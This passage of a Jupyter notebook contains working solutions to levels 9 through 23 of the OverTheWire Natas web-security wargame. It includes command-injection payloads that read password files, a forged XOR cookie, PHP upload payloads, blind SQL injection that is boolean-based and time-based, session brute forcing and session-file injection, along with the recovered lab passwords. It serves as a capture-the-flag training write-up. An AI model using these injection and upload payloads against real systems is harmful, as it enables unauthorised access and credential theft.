    "    \n",
    "    return flag\n",
    "\n",
    "    \n",
    "natas8()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas9\n",
    "http://natas9.natas.labs.overthewire.org/\n",
    "\n",
    "- passes form input to a shell command\n",
    "  ```php\n",
    "  if($key != \"\") {\n",
    "      passthru(\"grep -i $key dictionary.txt\");\n",
    "  }\n",
    "  ```\n",
    "- making sure that *$key* is \n",
    "  ```bash\n",
    "  `cat /etc/natas_webpass/natas10; echo \" /etc/natas_webpass/natas10\"`\n",
    "  ```\n",
    "  will execute\n",
    "  ```bash\n",
    "  grep whatevertheflagis /etc/natas_webpass/natas10 dictionary.txt\n",
    "  ```\n",
    "  on the shell\n",
    "- this outputs all lines from */etc/natas_webpass/natas10* and *dictionary.txt* containing the flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas9\", \"pass\": \"W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl\" };</script></head>\n",
       "<body>\n",
       "<h1>natas9</h1>\n",
       "<div id=\"content\">\n",
       "<form>\n",
       "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
       "</form>\n",
       "\n",
       "\n",
       "Output:\n",
       "<pre>\n",
       "/etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu\n",
       "</pre>\n",
       "\n",
       "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas9')\n",
    "def natas9():\n",
    "    request = natas.get_request(method='POST')\n",
    "    request.data = urlencode({'needle': '`cat /etc/natas_webpass/natas10; echo \" /etc/natas_webpass/natas10\"`', 'submit': 'send'}).encode()\n",
    "    reply = natas.readall(request)\n",
    "    \n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "\n",
    "natas9()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas10\n",
    "http://natas10.natas.labs.overthewire.org/\n",
    "\n",
    "- same as natas 9 but this time ; and & are not allowed in the needle string\n",
    "- bypassing the ; by simply using two subshells\n",
    "  ```bash\n",
    "  `cat /etc/natas_webpass/natas11``echo \" /etc/natas_webpass/natas11\"`\n",
    "  ```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas10\", \"pass\": \"nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu\" };</script></head>\n",
       "<body>\n",
       "<h1>natas10</h1>\n",
       "<div id=\"content\">\n",
       "\n",
       "For security reasons, we now filter on certain characters<br/><br/>\n",
       "<form>\n",
       "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
       "</form>\n",
       "\n",
       "\n",
       "Output:\n",
       "<pre>\n",
       "/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK\n",
       "</pre>\n",
       "\n",
       "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas10')\n",
    "def natas10():\n",
    "    request = natas.get_request(method='POST')\n",
    "    request.data = urlencode({'needle': '`cat /etc/natas_webpass/natas11``echo \" /etc/natas_webpass/natas11\"`', 'submit': 'send'}).encode()\n",
    "    reply = natas.readall(request)\n",
    "    \n",
    "    display(HTML(reply))\n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "\n",
    "natas10()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## natas 11\n",
    " http://natas11.natas.labs.overthewire.org/\n",
    " \n",
    " - page sends an cookie with xor enrypted base64'ed and jsonified data which defaults to\n",
    "   ```php\n",
    "   $defaultdata = array( \"showpassword\"=>\"no\", \"bgcolor\"=>\"#ffffff\");\n",
    "   ```\n",
    " - the enryption key can be gained by decrypting the cookie using the default json string as key\n",
    " - they gained key is repeating after 4 characters -> key length must have been 4\n",
    " - we can now use the key to create an own cookie which has *showpassword=yes* in the json string\n",
    "   so that index.php prints the flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('Date', 'Mon, 23 Sep 2019 18:16:07 GMT'), ('Server', 'Apache/2.4.10 (Debian)'), ('Set-Cookie', 'data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D'), ('Vary', 'Accept-Encoding'), ('Content-Length', '1085'), ('Connection', 'close'), ('Content-Type', 'text/html; charset=UTF-8')]\n",
      "b'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq'\n",
      "b'\\nUK\"\\x1e\\x00H+\\x02\\x04O%\\x03\\x13\\x1apS\\x0e]9S[\\x1a(\\x16\\x14W&\\x1e\\x05\\x1apSTY(\\x12\\x13],S\\n'\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas11\", \"pass\": \"U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK\" };</script></head>\n",
       "\n",
       "<h1>natas11</h1>\n",
       "<div id=\"content\">\n",
       "<body style=\"background: #abcdef;\">\n",
       "Cookies are protected with XOR encryption<br/><br/>\n",
       "\n",
       "The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>\n",
       "<form>\n",
       "Background color: <input name=bgcolor value=\"#abcdef\">\n",
       "<input type=submit value=\"Set color\">\n",
       "</form>\n",
       "\n",
       "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas11')\n",
    "def natas11():\n",
    "    def xor_encrypt(data, key):\n",
    "        result = b''\n",
    "        keylen = len(key)\n",
    "    \n",
    "        for i in range(len(data)):\n",
    "            result += bytes( [data[i] ^ key[i % keylen]] )\n",
    "        \n",
    "        return result\n",
    "\n",
    "    page = natas.urlopen()\n",
    "    headers = page.getheaders()\n",
    "    print(headers)\n",
    "    \n",
    "    cookie_data = page.getheader('Set-Cookie').replace('data=', '')\n",
    "    cookie_data = unquote(cookie_data)\n",
    "    cookie_data = binascii.a2b_base64(cookie_data)\n",
    "    cookie_data = xor_encrypt(cookie_data, b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}')\n",
    "    print(cookie_data)\n",
    "    \n",
    "    key = cookie_data[:4]\n",
    "    \n",
    "    cookie_data = xor_encrypt(b'{\"showpassword\":\"yes\",\"bgcolor\":\"#abcdef\"}', key)\n",
    "    print(cookie_data)\n",
    "    cookie_data = binascii.b2a_base64(cookie_data).strip()\n",
    "    cookie_data = quote(cookie_data)\n",
    "    \n",
    "    request = natas.get_request()\n",
    "    request.add_header('Cookie', 'data=' + cookie_data)\n",
    "    reply = natas.readall(request)\n",
    "    display(HTML(reply))\n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "\n",
    "natas11()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 12\n",
    "http://natas12.natas.labs.overthewire.org/\n",
    "\n",
    "- uploads the given file with a random filename but the same extension into the *upload/* path\n",
    "- an uploaded php file will be executed as php script\n",
    "- so were uploading a simple php file reading and outputting the */etc/natas_webpass/natas13* file which contains the flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas12')\n",
    "def natas12():\n",
    "    php_file = b'<?\\nreadfile(\"/etc/natas_webpass/natas13\");\\n?>'\n",
    "    data = b'--myBoundary\\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\\n\\n1000\\n'\n",
    "    data += b'--myBoundary\\nContent-Disposition: form-data; name=\"filename\"\\n\\npayload.php\\n'\n",
    "    data += b'--myBoundary\\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"payload.php\"\\nContent-Type: application/octet-stream\\n\\n'\n",
    "    data += php_file + b'\\n\\n'\n",
    "    data += b'--myBoundary--\\n'\n",
    "    \n",
    "    request = natas.get_request(method='POST')\n",
    "    request.add_header('Content-Type', 'multipart/form-data; boundary=myBoundary')\n",
    "    request.data = data\n",
    "    page = natas.readall(request)\n",
    "    \n",
    "    url = re.findall('upload/\\w*\\.php', page)[0]\n",
    "    reply = natas.readall(url)\n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "    \n",
    "natas12()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 13\n",
    "http://natas13.natas.labs.overthewire.org/\n",
    "\n",
    "- same as natas12 but this time the uploaded file needs to have a JFIF header (see https://de.wikipedia.org/wiki/JPEG_File_Interchange_Format)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas13')\n",
    "def natas13():\n",
    "    jfif_header = bytes([ 0xff, 0xd8, 0xff, 0xe0 ])\n",
    "    php_file = jfif_header + b'<?\\nreadfile(\"/etc/natas_webpass/natas14\");\\n?>'\n",
    "    data = b'--myBoundary\\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\\n\\n1000\\n'\n",
    "    data += b'--myBoundary\\nContent-Disposition: form-data; name=\"filename\"\\n\\npayload.php\\n'\n",
    "    data += b'--myBoundary\\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"payload.php\"\\nContent-Type: application/octet-stream\\n\\n'\n",
    "    data += php_file + b'\\n\\n'\n",
    "    data += b'--myBoundary--\\n'\n",
    "    \n",
    "    request = natas.get_request(method='POST')\n",
    "    request.add_header('Content-Type', 'multipart/form-data; boundary=myBoundary')\n",
    "    request.data = data\n",
    "    page = natas.readall(request)\n",
    "        \n",
    "    url = re.findall('upload/\\w*\\.php', page)[0]\n",
    "    reply = natas.urlopen(url).read()[len(jfif_header):].decode()\n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    \n",
    "    return flag\n",
    "    \n",
    "natas13()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 14\n",
    "http://natas14.natas.labs.overthewire.org/\n",
    "\n",
    "- sql injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<html>\r\n",
       "<head>\r\n",
       "<!-- This stuff in the header has nothing to do with the level -->\r\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\r\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\r\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\r\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\r\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\r\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\r\n",
       "<script>var wechallinfo = { \"level\": \"natas14\", \"pass\": \"Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1\" };</script></head>\r\n",
       "<body>\r\n",
       "<h1>natas14</h1>\r\n",
       "<div id=\"content\">\r\n",
       "Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\r\n",
       "</div>\r\n",
       "</body>\r\n",
       "</html>\r\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas14')\n",
    "def natas14():\n",
    "    request = natas.get_request(method='POST')\n",
    "    data = {\"username\": \"username\", \"password\": \"\\\" or 1=1 or \\\"\", \"submit\": \"send\"};\n",
    "    request.data = urlencode(data).encode()\n",
    "    \n",
    "    reply = natas.readall(request)\n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "\n",
    "natas14()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 15\n",
    "http://natas15.natas.labs.overthewire.org/\n",
    "\n",
    "- sql injection possible but we need to gain the contents of the password database column\n",
    "- do a simple bruteforce using case sensitive LIKE BINARY and % "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas15')\n",
    "def natas15():\n",
    "    chars = '0aA1bB2cC3dD4eE5fF6Gg7hH8iI9jJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ'\n",
    "    \n",
    "    username = 'natas16\" and password LIKE BINARY \"'\n",
    "    flag = ''\n",
    "    for i in range(32):\n",
    "        for next_character in chars:\n",
    "            data = {'username': username + flag + next_character + '%', 'submit': 'Check existence'}\n",
    "            request = natas.get_request(method='POST')\n",
    "            request.data = urlencode(data).encode()\n",
    "            reply = natas.readall(request)\n",
    "            if 'This user exists.' in reply:\n",
    "                flag += next_character\n",
    "                print(flag + \" ...\")\n",
    "                break\n",
    "    \n",
    "    return flag\n",
    "\n",
    "natas15()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 16\n",
    "http://natas16.natas.labs.overthewire.org/\n",
    "\n",
    "- if _\\$( ... )_ is returning a string then only parts of _dictionary.txt_ will be printed\n",
    "- idea: make _\\$( ... )_ return something, if ^pattern is found in _/etc/natas_webpass/natas17_\n",
    "- use pattern to make a brute force attack on the next unknown character of the flag\n",
    "- i.e. _\\$( grep ^d /etc/natas_webpass/natas17 )_ is not empty if the flag begins with character d\n",
    "  -> \"African\" will not be part of the results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas16')\n",
    "def natas16():\n",
    "    chars = '0aA1bB2cC3dD4eE5fF6Gg7hH8iI9jJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ'\n",
    "    \n",
    "    flag = ''\n",
    "    for i in range(32):\n",
    "        for next_character in chars:\n",
    "            data = {'needle': '$( grep ^' + flag + next_character + ' /etc/natas_webpass/natas17 )', 'submit': 'Search'}\n",
    "            request = natas.get_request(method='POST')\n",
    "            request.data = urlencode(data).encode()\n",
    "\n",
    "            reply = natas.readall(request)\n",
    "            if not '<pre>\\n\\nAfrican' in reply:\n",
    "                flag += next_character\n",
    "                print(flag + \" ...\")\n",
    "                break\n",
    "    \n",
    "    return flag\n",
    "\n",
    "natas16()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 17\n",
    "http://natas17.natas.labs.overthewire.org/\n",
    "\n",
    "- same as natas 15 but we need to use timing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas17')\n",
    "def natas17():\n",
    "    chars = '0aA1bB2cC3dD4eE5fF6Gg7hH8iI9jJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ'\n",
    "    \n",
    "    flag = ''\n",
    "    for i in range(32):\n",
    "        for next_character in chars:\n",
    "            data = {'username': 'natas18\" AND password LIKE BINARY \"' + flag + next_character + '%\" AND SLEEP(2) AND \"\"=\"', 'submit': 'Check existence'}\n",
    "            request = natas.get_request(method='POST')\n",
    "            request.data = urlencode(data).encode()\n",
    "\n",
    "            begin = time.perf_counter()\n",
    "            reply = natas.readall(request)\n",
    "            end = time.perf_counter()\n",
    "            \n",
    "            if end-begin > 1.5:\n",
    "                flag += next_character\n",
    "                print(flag + \" ...\")\n",
    "                break\n",
    "    \n",
    "    return flag\n",
    "\n",
    "natas17()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 18\n",
    "http://natas18.natas.labs.overthewire.org/\n",
    "\n",
    "- guess numeric session id between 0 and 640"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas18')\n",
    "def natas18():\n",
    "    for i in range(640):\n",
    "        request = natas.get_request()\n",
    "        request.add_header('Cookie', 'PHPSESSID=' + str(i))\n",
    "        reply = natas.readall(request)\n",
    "        \n",
    "        if 'credentials for the next level are' in reply:\n",
    "            break\n",
    "            \n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "\n",
    "natas18()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 19\n",
    "http://natas19.natas.labs.overthewire.org/\n",
    "\n",
    "- session id is now 'n-username' as hex - for n between 0 and 640"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas19')\n",
    "def natas19():\n",
    "    for i in range(640):\n",
    "        request = natas.get_request()\n",
    "        sessid = str(i) + '-admin'\n",
    "        request.add_header('Cookie', 'PHPSESSID=' + binascii.hexlify(sessid.encode()).decode())\n",
    "        reply = natas.readall(request)\n",
    "        \n",
    "        if 'credentials for the next level are' in reply:\n",
    "            break\n",
    "            \n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "\n",
    "natas19()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 20\n",
    "http://natas20.natas.labs.overthewire.org/\n",
    "\n",
    "- session data is written to file as\\\n",
    "  key1 value1\\\n",
    "  key2 value2\\\n",
    "  \\\n",
    "  i.e.\\\n",
    "  name admin\\\n",
    "  admin 1\n",
    "- but line breaks in session values are not escaped prior writing - so we can set the admin flag ourselves and reread the session"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Session-Cookie: PHPSESSID=vbjsnj9vee5tutgr0uipbv7kj2\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<html>\r\n",
       "<head>\r\n",
       "<!-- This stuff in the header has nothing to do with the level -->\r\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\r\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\r\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\r\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\r\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\r\n",
       "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\r\n",
       "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF\" };</script></head>\r\n",
       "<body>\r\n",
       "<h1>natas20</h1>\r\n",
       "<div id=\"content\">\r\n",
       "You are an admin. The credentials for the next level are:<br><pre>Username: natas21\n",
       "Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>\r\n",
       "<form action=\"index.php\" method=\"POST\">\r\n",
       "Your name: <input name=\"name\" value=\"anyuser\"><br>\r\n",
       "<input type=\"submit\" value=\"Change name\" />\r\n",
       "</form>\r\n",
       "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\r\n",
       "</div>\r\n",
       "</body>\r\n",
       "</html>\r\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'IFekPyrQXftziDEsUr3x21sYuahypdgJ'"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas20')\n",
    "def natas20():\n",
    "    request = natas.get_request(method='POST')\n",
    "    request.data = urlencode({'name': 'anyuser\\nadmin 1', 'submit': 'Change name'}).encode()\n",
    "    response = natas.urlopen(request)\n",
    "    cookie = response.getheader('Set-Cookie').split(';')[0]\n",
    "    reply = response.read().decode()\n",
    "    \n",
    "    print('Session-Cookie: ' + cookie)\n",
    "    \n",
    "    request = natas.get_request()\n",
    "    request.add_header('Cookie', cookie)\n",
    "    reply = natas.readall(request)\n",
    "\n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "    \n",
    "natas20()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 21\n",
    "http://natas21.natas.labs.overthewire.org/\n",
    "\n",
    "- site is crosshosted on different subdomains - but the php instance remains the same\\\n",
    "  -> sessions existing on one subdomain will be the same on the other one\n",
    "- cross hosted site stores every variable in the shared php session\n",
    "- idea: set admin=1 flag in the session of the cross hosted domain\\\n",
    "  -> load the same session on the original site\\\n",
    "  -> gather the flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas21')\n",
    "def natas21():\n",
    "    request = natas.get_request(url='http://natas21-experimenter.natas.labs.overthewire.org/index.php', method='POST')\n",
    "    request.data = urlencode({'admin': 1, 'submit': 'Update'}).encode()\n",
    "    response = natas.urlopen(request)\n",
    "    cookie = response.getheader('Set-Cookie').split(';')[0]\n",
    "    \n",
    "    request = natas.get_request()\n",
    "    request.add_header('Cookie', cookie)\n",
    "    reply = natas.readall(request)\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "    \n",
    "natas21()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 22\n",
    "http://natas22.natas.labs.overthewire.org/\n",
    "\n",
    "- flag is returned by the server if GET parameter _revelio_ is present\n",
    "- but server also tells the browser to relocate to / url - so the flag will not be visible to the user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas22')\n",
    "def natas22():\n",
    "    request = natas.get_request('?revelio')\n",
    "    \n",
    "    # use HTTPHandler() directly because urlopen() would immediately follow the Location: header\n",
    "    request.timeout = 60\n",
    "    reply = HTTPHandler().http_open(request).read().decode()\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "\n",
    "natas22()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 23\n",
    "http://natas23.natas.labs.overthewire.org/\n",
    "\n",
    "- we need to fulfill _strstr(\\\\$_REQUEST[\"passwd\"],\"iloveyou\") && (\\\\$_REQUEST[\"passwd\"] > 10 )_"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas23\", \"pass\": \"D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE\" };</script></head>\n",
       "<body>\n",
       "<h1>natas23</h1>\n",
       "<div id=\"content\">\n",
       "\n",
       "Password:\n",
       "<form name=\"input\" method=\"get\">\n",
       "    <input type=\"text\" name=\"passwd\" size=20>\n",
       "    <input type=\"submit\" value=\"Login\">\n",
       "</form>\n",
       "\n",
